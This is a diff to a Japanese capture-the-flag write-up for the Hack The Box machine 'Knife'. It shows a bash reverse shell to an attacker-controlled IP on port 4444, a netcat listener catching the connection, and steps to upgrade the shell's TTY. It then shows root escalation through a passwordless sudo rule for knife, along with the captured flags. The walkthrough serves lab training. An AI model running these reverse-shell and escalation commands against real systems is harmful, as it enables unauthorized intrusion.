@@ -62,17 +62,33 @@ $ bash -c "bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"
 ```
 リバースシェル取得、ユーザフラグゲット！
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.129.207.242] 51632
 bash: cannot set terminal process group (911): Inappropriate ioctl for device
 bash: no job control in this shell
+
+james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+james@knife:/$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               ^C
+
+james@knife:/$ export SHELL=bash
+
+james@knife:/$ export TERM=xterm-256color
+
+james@knife:/$ stty rows 66 columns 236
+
 james@knife:/$ id
-id
 uid=1000(james) gid=1000(james) groups=1000(james)
 
-james@knife:~$ cat /home/james/user.txt
-cat /home/james/user.txt
+james@knife:/$ cat /home/james/user.txt
 bba83508c99c3412f30c9113955ebe23
 ```
 
@@ -80,8 +96,7 @@ bba83508c99c3412f30c9113955ebe23
 ## STEP 3
 `/usr/bin/knife`がパスワードなしでroot権限実行できる
 ```sh
-james@knife:~$ sudo -l
-sudo -l
+james@knife:/$ sudo -l
 Matching Defaults entries for james on knife:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -92,11 +107,10 @@ User james may run the following commands on knife:
 [gtfobins](https://gtfobins.github.io/gtfobins/knife/)で権限昇格のコマンドを確認、ルートフラグゲット
 ```sh
 james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
-sudo knife exec -E 'exec "/bin/sh"'
 
-id
+# id
 uid=0(root) gid=0(root) groups=0(root)
 
-cat /root/root.txt
+# cat /root/root.txt
 c5d240400c720f165d8b28ebcae5b6bd
 ```
